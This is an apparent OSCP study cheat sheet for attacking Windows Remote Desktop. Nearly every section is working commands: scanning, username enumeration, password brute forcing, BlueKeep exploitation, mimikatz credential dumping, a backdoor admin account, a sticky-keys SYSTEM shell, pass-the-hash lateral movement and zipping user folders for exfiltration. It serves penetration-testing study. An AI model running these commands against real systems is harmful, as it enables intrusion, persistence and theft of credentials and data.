# ğŸ§± **RDP Pentesting â€“ OSCP Field Guide**

> **Service:** Remote Desktop Protocol
> **Port:** `3389/tcp`
> **Protocol:** Microsoft proprietary GUI remote access

---

## ğŸ” 1. Recon & Discovery

```bash
nmap -p 3389 target
nmap -p 3389 -sV target
```

### Extract OS & Security Info

```bash
nmap -p 3389 --script rdp-ntlm-info target
nmap -p 3389 --script rdp-enum-encryption target
```

> **Look for**

* Windows version
* NLA enabled/disabled
* Encryption level
* CredSSP usage

---

## ğŸ·ï¸ 2. Banner Grabbing

```bash
python rdp-sec-check.py target
openssl s_client -connect target:3389 < /dev/null 2>&1 | openssl x509 -noout -text
```

---

## ğŸ§­ 3. Username Enumeration

RDP reveals different errors for valid vs invalid users.

### Tools

```bash
rdp_check.exe target users.txt
crowbar -b rdp -s target/32 -u users.txt -C passwords.txt
```

**Common users**

```
Administrator
admin
user
guest
```

---

## ğŸ” 4. Credential Attacks

### Brute Force

```bash
hydra -t 1 -V -f -l administrator -P passwords.txt rdp://target
ncrack -vv --user administrator -P passwords.txt rdp://target
crowbar -b rdp -s target/32 -u administrator -C passwords.txt
```

### Metasploit Scan

```bash
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS target
run
```

---

## ğŸ§¬ 5. RDP Login

```bash
xfreerdp  /u:vagrant /sec:rdp /cert:ignore /v:192.168.93.103
xfreerdp  /u:vagrant /sec:nla /cert:ignore /v:192.168.93.103 
xfreerdp /v:192.168.93.103 /u:vagrant /sec:tls /cert:ignore /v:192.168.93.103 
xfreerdp3 /u:administrator /p:password /v:target
xfreerdp3 /u:DOMAIN\\user /p:password /v:target
xfreerdp3 /u:administrator /pth:NTHASH /v:target /cert:ignore
```

---

## ğŸ§¨ 6. Exploitation

### BlueKeep (CVE-2019-0708)

```bash
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
run

use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target
set TARGET 2
exploit
```

---

## ğŸ•µï¸ 7. Post-Exploitation

### Credential Dumping

```bash
mimikatz
privilege::debug
sekurlsa::logonpasswords
```

### SAM Extraction

```bash
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system
impacket-secretsdump -sam sam -system system LOCAL
```

---

## ğŸ§± 8. Persistence

```bash
net user backdoor P@ssw0rd123! /add
net localgroup administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add
```

### Sticky Keys Backdoor

```bash
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

Press **Shift 5x** at login â†’ SYSTEM shell.

---

## ğŸŒ 9. Lateral Movement

```bash
xfreerdp /u:administrator /pth:HASH /v:another-host
psexec \\another-host -u user -p pass cmd
wmic /node:another-host /user:user /password:pass process call create "cmd.exe"
```

---

## ğŸ“¤ 10. Data Exfiltration

```powershell
Compress-Archive C:\Users\ C:\Temp\loot.zip
copy C:\Temp\loot.zip \\tsclient\c\loot\
```

---

## ğŸ§— 11. Privilege Escalation Checks

```bash
whoami /all
whoami /priv
wmic service get name,pathname,startmode | findstr /i auto | findstr /v """
```

AlwaysInstallElevated:

```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## âš ï¸ High-Value Misconfigurations (OSCP Gold)

* âŒ No NLA
* âŒ No lockout policy
* âŒ Weak/default creds
* âŒ Exposed to internet
* âŒ Clipboard & drive redirection
* âŒ No MFA
* âŒ Outdated Windows
* âŒ No logging/monitoring

---

## ğŸ§ª CVEs to Remember

| CVE                | Name       | Impact       |
| ------------------ | ---------- | ------------ |
| CVE-2019-0708      | BlueKeep   | Wormable RCE |
| CVE-2019-1181/1182 | RD Gateway | RCE          |
| CVE-2020-0609/0610 | RD Gateway | RCE          |
| CVE-2012-0002      | MS12-020   | DoS          |

---

## ğŸ§° Tools for OSCP

`xfreerdp` â€¢ `crowbar` â€¢ `hydra` â€¢ `ncrack` â€¢ `Metasploit` â€¢ `mimikatz` â€¢ `impacket` â€¢ `Seth`



